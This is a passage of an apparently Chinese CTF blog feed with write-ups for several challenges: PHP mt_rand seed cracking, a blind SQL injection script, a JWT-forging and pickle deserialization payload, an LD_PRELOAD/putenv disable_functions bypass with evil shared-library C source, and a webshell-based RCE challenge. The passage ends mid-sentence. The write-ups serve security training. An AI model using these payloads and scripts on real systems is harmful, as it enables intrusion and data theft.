        <content type="html"><![CDATA[<p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235829685.png" alt="image-20211024235829685"></p><p>查看源代码</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211024235901200.png" alt="image-20211024235901200"></p><p>看到一个关键点，check.php，访问一下</p><pre><code class="php"> &lt;?php#这不是抽奖程序的源代码！不许看！header(&quot;Content-Type: text/html;charset=utf-8&quot;);session_start();if(!isset($_SESSION[&#39;seed&#39;]))&#123;$_SESSION[&#39;seed&#39;]=rand(0,999999999);&#125;mt_srand($_SESSION[&#39;seed&#39;]);$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;$str=&#39;&#39;;$len1=20;for ( $i = 0; $i &lt; $len1; $i++ )&#123;    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       &#125;$str_show = substr($str, 0, 10);echo &quot;&lt;p id=&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;if(isset($_POST[&#39;num&#39;]))&#123;    if($_POST[&#39;num&#39;]===$str)&#123;x        echo &quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;;    &#125;    else&#123;        echo &quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;;    &#125;&#125;show_source(&quot;check.php&quot;); </code></pre><p>这里涉及到了伪随机数漏洞，即当确定了种子后，随机数每次生成数的所有数是重复得，并不是真正意义上的随机数。</p><pre><code class="php">&lt;?php  mt_srand(12345);    echo mt_rand().&quot;&lt;br/&gt;&quot;;?&gt;  </code></pre><p>当你每次运行这个函数得到的随机数都是相同的。</p><p>这个就像一个关系式：y=ax，如果我们能得到y和a就可以推出x。</p><p>当然，实际上这个函数的关系是十分复杂的，但我们仍然可以用工具去破解。</p><p>首先，我们要把题目给我们的线索转化为脚本可读的形式：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025011936452.png" alt="image-20211025011936452"></p><pre><code class="python">str1 = &#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;str2 = &#39;nngMHvCoQB&#39;res = &#39;&#39;for i in range(len(str2)):    for j in range(len(str1)):        if str2[i] == str1[j]:            res += str(j)+&#39; &#39;+str(j)+&#39; &#39;+&#39;0&#39;+&#39; &#39;+str(len(str1)-1)+&#39; &#39;            breakprint(res)</code></pre><p>![image-20211025012020617](GWCTF-2019枯燥的抽奖-0x30-0x3f/image-20211025012020617.png</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39.png" alt="Kali-Linux-2021.3-vmware-amd64-2021-10-25-01-20-39"></p><p>获得到了种子，我们来生成下后序的字符串：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025012917063.png" alt="image-20211025012917063"></p><p>我们看到前面十位完全吻合。</p><p>提交：</p><p><img src="/2021/10/24/GWCTF-2019%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96-0x30-0x3f/image-20211025013042600.png" alt="image-20211025013042600"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 伪随机数 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WUSTCTF2020 颜值成绩查询_0x21-0x2F</title>
      <link href="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/"/>
      <url>/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/</url>
      
        <content type="html"><![CDATA[<p>进去只有一个简单得输入框，测试下是否存在sql注入</p><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145243657.png" alt="image-20211022145243657"></p><p>先输入1，2，3等</p><p>发现有数据显示</p><p>使用异或</p><p><a href="http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0%5E1">http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/?stunum=0^1</a></p><p>结果显示得是stunum=1的界面</p><p>说明存在sql盲注</p><p>写一个简单脚本：</p><pre><code>import requestsimport timeurl = &quot;http://fba65ac4-7e1e-4c73-bb3b-35bfdef68f71.node4.buuoj.cn:81/&quot;data= &quot;&quot;for i in range(10000):    min = 32    max = 128    while (min &lt; max) :        mid = (min + max) // 2    # 爆破数据库名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破表名        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破字段        #payload = &quot;?stunum=0^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;flag&#39;)),%d,1))&gt;%d)&quot;%(i,mid)    # 爆破数据        payload = &quot;?stunum=0^(ascii(substr((select(group_concat(value))from(flag)),%d,1))&gt;%d)&quot;%(i,mid)        urls = url+payload        print(urls)        response = requests.get(url=urls)        time.sleep(0.2)        if &quot;Hi admin, your score is: 100&quot; in response.text:            min = mid+1        else:            max = mid        mid = (min + max) // 2    data += chr(mid)    print(data)</code></pre><p><img src="/2021/10/22/WUSTCTF2020-%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2-0x21-0x2F/image-20211022145433880.png" alt="image-20211022145433880"></p><p>写这个脚本花了挺长时间，原因是对sql注入语句还不熟练，容易被括号迷惑，看晕。</p><p>以后要注重写代码的能力。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2019 华北赛区 Day1 Web2 ikun_0x10-0x1F</title>
      <link href="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/"/>
      <url>/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/</url>
      
        <content type="html"><![CDATA[<p>一打开页面，很魔性。。</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020233731895.png" alt="image-20211020233731895"></p><p>先注册个账号</p><p>下面提示一定要买到lv6</p><p>翻了好几面，没有找到，于是写了一个简单的爬虫脚本：S</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234222133.png" alt="image-20211020234222133"></p><p>注意爬虫要慢一点，buu很容易崩。</p><pre><code class="python">import urllib.requestimport timefor i in range(0,1000):    url = &#39;http://272059db-2e14-4adc-ae85-8f5a64a35acb.node4.buuoj.cn:81/shop?page=&#39;+str(i)    print(url)    time.sleep(1)    response = urllib.request.urlopen(url).read().decode(&#39;utf-8&#39;)    if &#39;lv6.png&#39; in response:        print(i)        break</code></pre><p>发现在181面</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234439410.png" alt="image-20211020234439410"></p><p>不过钱却不太够，用burp抓下包试一试</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234524015.png" alt="image-20211020234524015"></p><p>发现discount=0.8，将它改小</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234610565.png" alt="image-20211020234610565"></p><p>发现只允许admin登录</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020234638452.png" alt="image-20211020234638452"></p><p>仔细分析下数据包，发现了jwt，解一下码：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235006767.png" alt="image-20211020235006767"></p><p>爆破一下（感觉这个挺靠运气和字典吧）</p><p>发现密钥为 1Kun</p><p>重新生成admin的jwt</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235300543.png" alt="image-20211020235300543"></p><p>查看源代码:</p><p>在这里发现源码泄露：</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235354388.png" alt="image-20211020235354388"></p><p>下载下来，找到一个叫admin.py的文件，打开</p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235429287.png" alt="image-20211020235429287"></p><p>看到了pickle，查阅资料可知：</p><p>假设你有一个字典，你想存储它，稍后再取出来。你可以把它的内容写入一个文件，小心翼翼地确保使用了正确地格式，要把它读取出来，你可以使用 exec() 或处理文件输入。但是这种方法并不可靠：如果你使用纯文本来存储重要数据，数据很容易以多种方式被破坏或者修改，导致你的程序崩溃，更糟糕的情况下，还可能在你的计算机上运行恶意代码。因此，我们要pickle它:</p><pre><code>import pickledata = &#123;&#39;foo&#39;: [1,2,3],                &#39;bar&#39;: (&#39;Hello&#39;, &#39;world!&#39;),                &#39;baz&#39;: True&#125;jar = open(&#39;data.pkl&#39;, &#39;wb&#39;)pickle.dump(data, jar) # 将pickle后的数据写入jar文件jar.close()</code></pre><p>过了几个小时，我们想把它取出来，我们只需要反pickle它:</p><pre><code>import picklepkl_file = open(&#39;data.pkl&#39;, &#39;rb&#39;) # 与pickle后的数据连接data = pickle.load(pkl_file) # 把它加载进一个变量print datapkl_file.close()</code></pre><p>将会发生什么？正如你期待的，它就是我们之前的 data 。</p><p>现在，还需要谨慎地说一句：  pickle并不完美。Pickle文件很容易因为事故或被故意的破坏掉。Pickling或许比纯文本文件安全一些，但是依然有可能被用来运行恶意代码。而且它还不支持跨Python版本，所以不要指望分发pickle对象之后所有人都能正确地读取。然而不管怎么样，它依然是一个强有力的工具，可以用于缓存和其他类型的持久化工作。</p><h3 id="11-13-2-Pickle你的对象"><a href="#11-13-2-Pickle你的对象" class="headerlink" title="11.13.2. Pickle你的对象"></a><a href="http://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html#id53">11.13.2. Pickle你的对象</a></h3><p>Pickle不仅仅可以用于内建类型，任何遵守pickle协议的类都可以被pickle。Pickle协议有四个可选方法，可以让类自定义它们的行为（这和C语言扩展略有不同，那不在我们的讨论范围之内）。</p><ul><li> <strong>getinitargs</strong>(self)</li></ul><p>  如果你想让你的类在反pickle时调用 <strong>init</strong> ，你可以定义__getinitargs__(self) ，它会返回一个参数元组，这个元组会传递给__init__ 。注意，这个方法只能用于旧式类。</p><ul><li> <strong>getnewargs</strong>(self)</li></ul><p>  对新式类来说，你可以通过这个方法改变类在反pickle时传递给 <strong>new</strong> 的参数。这个方法应该返回一个参数元组。</p><ul><li> <strong>getstate</strong>(self)</li></ul><p>  你可以自定义对象被pickle时被存储的状态，而不使用对象的 <strong>dict</strong> 属性。 这个状态在对象被反pickle时会被 <strong>setstate</strong> 使用。</p><ul><li> <strong>setstate</strong>(self)</li></ul><p>  当一个对象被反pickle时，如果定义了 <strong>setstate</strong> ，对象的状态会传递给这个魔法方法，而不是直接应用到对象的 <strong>dict</strong> 属性。这个魔法方法和__getstate__ 相互依存：当这两个方法都被定义时，你可以在Pickle时使用任何方法保存对象的任何状态。</p><ul><li> <strong>reduce</strong>(self)</li></ul><p>  当定义扩展类型时（也就是使用Python的C语言API实现的类型），如果你想pickle它们，你必须告诉Python如何pickle它们。 <strong>reduce</strong> 被定义之后，当对象被Pickle时就会被调用。它要么返回一个代表全局名称的字符串，Pyhton会查找它并pickle，要么返回一个元组。这个元组包含2到5个元素，其中包括：一个可调用的对象，用于重建对象时调用；一个参数元素，供那个可调用对象使用；被传递给 <strong>setstate</strong> 的状态（可选）；一个产生被pickle的列表元素的迭代器（可选）；一个产生被pickle的字典元素的迭代器（可选）；</p><ul><li> <strong>reduce_ex</strong>(self)</li></ul><p>  <strong>reduce_ex</strong> 的存在是为了兼容性。如果它被定义，在pickle时__reduce_ex__ 会代替 <strong>reduce</strong> 被调用。 <strong>reduce</strong> 也可以被定义，用于不支持 <strong>reduce_ex</strong> 的旧版pickle的API调用。</p><p>这里构造payload,传给become：</p><pre><code>import pickleimport urllibclass payload(object):    def __reduce__(self):       return (eval, (&quot;open(&#39;/flag.txt&#39;,&#39;r&#39;).read()&quot;,))a = pickle.dumps(payload())a = urllib.quote(a)print a</code></pre><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235644482.png" alt="image-20211020235644482"></p><p><img src="/2021/10/20/CISCN2019-%E5%8D%8E%E5%8C%97%E8%B5%9B%E5%8C%BA-Day1-Web2-ikun-0x10-0x1F/image-20211020235657704.png" alt="image-20211020235657704"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 刷题 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jwt </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过LD_PRELOAD与putenv组合拳绕过disable_functions函数</title>
      <link href="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/"/>
      <url>/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>使用场景：</p><p>当拿到了一个网站shell，但命令基本都无法使用时，就很有可能是disable_functions导致的。</p><p>无命令执行功能的 webshell 是无意义的，得突破！</p><p>首先来介绍下我们需要使用的两个函数：</p><p>LD_PRELOAD:</p><p>google给出如下定义：</p><pre><code>LD_PRELOAD is an optional environmental variable containing one or more paths to shared libraries, or shared objects, that the loader will load before any other shared library including the C runtime library (libc.so) This is called preloading a library.</code></pre><p>即LD_PRELOAD这个环境变量指定路径的文件，会在其他文件被调用前，最先被调用。</p><p>PUTENV函数：可以设置环境变量</p><pre><code class="php">putenv ( string $setting ) : bool</code></pre><p>添加 setting 到服务器环境变量。 环境变量仅存活于当前请求期间。 在请求结束时环境会恢复到初始状态。</p><p>一般而言，利用漏洞控制 web 启动新进程 a.bin，a.bin 内部调用系统函数 b()，b()  位于系统共享对象 c.so  中，所以系统为该进程加载共 c.so，想法在 c.so 前优先加载可控的 c_evil.so，c_evil.so  内含与 b()  同名的恶意函数，由于 c_evil.so 优先级较高，所以，a.bin 将调用到 c_evil.so 内 b() 而非系统的  c.so 内  b()，同时，c_evil.so 可控，达到执行恶意代码的目的。</p><h2 id="传统方式-hijacking-function"><a href="#传统方式-hijacking-function" class="headerlink" title="传统方式(hijacking function)"></a>传统方式(hijacking function)</h2><p>在已有的文章中显示，一般使用php<code>mail()</code>函数进行触发，我们简单分析一下</p><p>这里简单写个demo</p><pre><code class="php">&lt;?phpmail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p>我们strace一下，可以看到运行这个脚本的时候，程序会启子进程来调用sendmail</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;test.php&quot;], [/* 20 vars */]) = 0[pid 23864] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;/usr/sbin/sendmail -t -i &quot;], [/* 20 vars */]) = 0[pid 23865] execve(&quot;/usr/sbin/sendmail&quot;, [&quot;/usr/sbin/sendmail&quot;, &quot;-t&quot;, &quot;-i&quot;], [/* 20 vars */]) = 0</code></pre><p>那么我们只要看一下sendmail使用了哪些函数</p><p><a href="https://p5.ssl.qhimg.com/t01c76b4a9b6bc50197.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01c76b4a9b6bc50197.png" alt="img"></a></p><p>有很多函数可以使用，这里可以选择geteuid()，然后我们编写自己的evil shared libraries：hack.c</p><pre><code class="c">#include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;string.h&gt;void payload() &#123;        system(&quot;ls / &gt; /tmp/sky&quot;);&#125;int geteuid() &#123;    if (getenv(&quot;LD_PRELOAD&quot;) == NULL) &#123; return 0; &#125;    unsetenv(&quot;LD_PRELOAD&quot;);    payload();&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC hack.c -o hackgcc --share hack -o hack.so</code></pre><p>然后我们运行脚本</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./hack.so&quot;);mail(&#39;&#39;,&#39;&#39;,&#39;&#39;,&#39;&#39;);?&gt;</code></pre><p><a href="https://p0.ssl.qhimg.com/t01afcea293e08668c6.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01afcea293e08668c6.png" alt="img"></a></p><p>不难发现它执行了命令，然后可以发现/tmp目录下多了一个文件sky</p><pre><code>root@sky:~# ls /tmp | grep skysky</code></pre><p>我们查看一下</p><pre><code>root@sky:~# cat /tmp/skybinbootdevetchomeliblib32....</code></pre><p>发现成功执行命令</p><p>但是这是基于存在sendmail()这个常用函数的基础上，如果目标的sendmail()函数也被禁用了那该怎么办呢？</p><p>下面来介绍改进版的：</p><h2 id="改进版-hijack-shared-library"><a href="#改进版-hijack-shared-library" class="headerlink" title="改进版(hijack shared library)"></a>改进版(hijack shared library)</h2><p>已经没有了sendmail，但我们依旧可以进行rce，可使用如下文件sky.c</p><pre><code>#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>其中<code>__attribute__ ((__constructor__))</code>有如下说明</p><pre><code>1.It&#39;s run when a shared library is loaded, typically during program startup.2.That&#39;s how all GCC attributes are; presumably to distinguish them from function calls.3.The destructor is run when the shared library is unloaded, typically at program exit.</code></pre><p>所以当我们最开始将evil shared library load上后，就会触发<code>__attribute__ ((__constructor__))</code>，从而达成我们rce的目的.</p><p>常考察的还有php-imagick</p><p>我们发现如下对应关系</p><p><a href="https://p0.ssl.qhimg.com/t018ee5e5eadefc3997.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t018ee5e5eadefc3997.png" alt="img"></a></p><p>我们发现当文件是MPEG format时，程序会调用’ffmpeg’ program进行转换，而如下后缀都被认为成MPEG format</p><p><a href="https://p2.ssl.qhimg.com/t01b63cd8517778cd0f.png"><img src="/2021/10/19/%E9%80%9A%E8%BF%87LD-PRELOAD%E4%B8%8Eputenv%E7%BB%84%E5%90%88%E6%8B%B3%E7%BB%95%E8%BF%87disable-functions%E5%87%BD%E6%95%B0/t01b63cd8517778cd0f.png" alt="img"></a></p><p>我们测试一下.wmv</p><p>写出脚本</p><pre><code class="php">&lt;?php$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>我们测试一下</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0[pid 25217] execve(&quot;/bin/sh&quot;, [&quot;sh&quot;, &quot;-c&quot;, &quot;&quot;ffmpeg&quot; -v -1 -i &quot;/tmp/magick-2&quot;...], [/* 21 vars */]) = 0</code></pre><p>可以发现的确成功启动了子进程，调用了ffmpeg</p><p>但是如果sky.wmv文件不存在时</p><pre><code>execve(&quot;/usr/bin/php&quot;, [&quot;php&quot;, &quot;sky.php&quot;], [/* 21 vars */]) = 0</code></pre><p>则不会调用ffmpeg</p><p>所以也不难分析出，应该是有一步判断文件是否存在的操作，再会去进行调用相关程序进行解码转换的操作</p><p>所以如果想利用Imagick新起子进程，那么我们得先有后面的参数文件，当然这并不是什么难事。</p><p> payload &amp; attack</p><p>那么只剩最后的攻击了，找到了可以起子进程的方式，只差构造evil shared library了</p><p>我们还是用之前的sky.c</p><pre><code class="c">#define _GNU_SOURCE#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/types.h&gt;__attribute__ ((__constructor__)) void angel (void)&#123;    unsetenv(&quot;LD_PRELOAD&quot;);    system(&quot;ls&quot;);&#125;</code></pre><p>然后编译一下</p><pre><code>gcc -c -fPIC sky.c -o skygcc --share sky -o sky.so</code></pre><p>测试一下</p><pre><code class="php">&lt;?phpputenv(&quot;LD_PRELOAD=./sky.so&quot;);$img = new Imagick(&#39;sky.wmv&#39;);?&gt;</code></pre><p>运行发现</p><pre><code>root@sky:~# php sky.phpbin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib32  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  srv  sys    test  tmp  usr    var  vmlinuz  vmlinuz.oldPHP Fatal error:  Uncaught ImagickException: unable to open image `/tmp/magick-25528VpF8npGTawCz.pam&#39;: No such file or directory @ error/blob.c/OpenBlob/2712 in /root/sky.php:3Stack trace:#0 /root/sky.php(3): Imagick-&gt;__construct(&#39;sky.wmv&#39;)#1 &#123;main&#125;  thrown in /root/sky.php on line 3</code></pre><p>我们成功的进行了列目录</p><p>这里串一下思路：</p><p>首先执行sky.php ,设置了恶意环境变量。下一步我们需要调用子进程来加载环境变量，所以这里就会使用new imagick(‘sky.wmv’),调用了ffmpeg这个子进程，这个进程在加载之前就调用了环境变量，加载了共享对象sky.so.加载完后它会自动执行__attribute__ ((<strong>constructor</strong>)),就会调用system命令。</p><h2 id="getflag流程"><a href="#getflag流程" class="headerlink" title="getflag流程:"></a>getflag流程:</h2><p>那么现在思路很清晰：</p><p>1.把我们的sky.so和sky.wmv上传到题目的/tmp/sandbox中</p><p>2.利用backdoor运行sky.php</p><p>3.在tmp目录读取重定向的结果</p><p>参考：<a href="https://www.anquanke.com/post/id/175403">https://www.anquanke.com/post/id/175403</a> （膜拜大佬，基本都是搬过来的，自己的代码功底太弱，大佬讲的又非常好就搬运了一下）</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> 常见漏洞和手法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 绕过 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>极客大挑战 2019 RCE ME __0X01-0X0F</title>
      <link href="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/"/>
      <url>/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/</url>
      
        <content type="html"><![CDATA[<h1 id="打开题目，源码如图，看起来很简单："><a href="#打开题目，源码如图，看起来很简单：" class="headerlink" title="打开题目，源码如图，看起来很简单："></a>打开题目，源码如图，看起来很简单：</h1><pre><code class="php">&lt;?phperror_reporting(0);if(isset($_GET[&#39;code&#39;]))&#123;            $code=$_GET[&#39;code&#39;];                    if(strlen($code)&gt;40)&#123;                                        die(&quot;This is too Long.&quot;);                                                &#125;                    if(preg_match(&quot;/[A-Za-z0-9]+/&quot;,$code))&#123;                                        die(&quot;NO.&quot;);                                                &#125;                    @eval($code);&#125;else&#123;            highlight_file(__FILE__);&#125;// ?&gt;</code></pre><p>重点关注 preg_match() 函数，它将所有的字母和数字都进行了过滤，所以我们无法通过$code直接传入命令，因此需要绕过。</p><p>最常用的就是取反绕过。</p><p>先取phpinfo来测试一下</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143439534.png" alt="image-20211018143439534"></p><p>为什么要加urlencode()？这里是因为字符串取反后会变成无法识别的字符，而这也是能绕过preg_match()函数的原因。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143653122.png" alt="image-20211018143653122"></p><p>成功得到信息。</p><p>下一步考虑通过取反来构建webshell。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143038799.png" alt="image-20211018143038799"></p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143850709.png" alt="image-20211018143850709"></p><p>测试一下webshell是否有效：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144115367.png" alt="image-20211018144115367"></p><p>成功，使用蚁剑来连接一下。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144244347.png" alt="image-20211018144244347"></p><p>连接成功。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144318564.png" alt="image-20211018144318564"></p><p>在根目录发现了readflag和flag，根据经验是要我们执行readflag来获取到flag。</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144428698.png" alt="image-20211018144428698"></p><p>这时候就懵逼了，命令无法执行是一个废shell。</p><p>让我们再会到phpinfo()仔细观察，发现如下：</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018143523288.png" alt="image-20211018143523288"></p><p>敏感函数基本全被禁用了。</p><p>那我们就要绕过disable_functions来执行readflag文件了。</p><h2 id="蚁剑中有一个插件可以绕过disable-functions-非预期解法"><a href="#蚁剑中有一个插件可以绕过disable-functions-非预期解法" class="headerlink" title="蚁剑中有一个插件可以绕过disable_functions(非预期解法)"></a>蚁剑中有一个插件可以绕过disable_functions(非预期解法)</h2><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018144830831.png" alt="image-20211018144830831"></p><p>启用插件，选择</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145031532.png" alt="image-20211018145031532"></p><p>发现成功绕过，并执行readflag文件获取到了flag</p><p><img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211018145133785.png" alt="image-20211018145133785"></p><h2 id="通过LD-PRELOAD与putenv来执行命令"><a href="#通过LD-PRELOAD与putenv来执行命令" class="headerlink" title="通过LD_PRELOAD与putenv来执行命令"></a>通过LD_PRELOAD与putenv来执行命令</h2><p>基本思路：</p><p>利用linux提供的LD_preload环境变量，劫持共享so，在启动子进程的时候，新的子进程会加载我们恶意的so拓展，然后我们可以在so里面定义同名函数，即可劫持API调用，成功RCE。在另一篇博客中我会详细的介绍下这个，这里不做深入讨论。</p><p>发现/var/tmp目录下有上传权限，上传exp，<img src="/2021/10/18/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-RCE-ME-0X01-0X0F/image-20211019221359870.png" alt="image-20211019221359870"></p><p>bypass_disablefunc.php 为命令执行 webshell，提供三个 GET 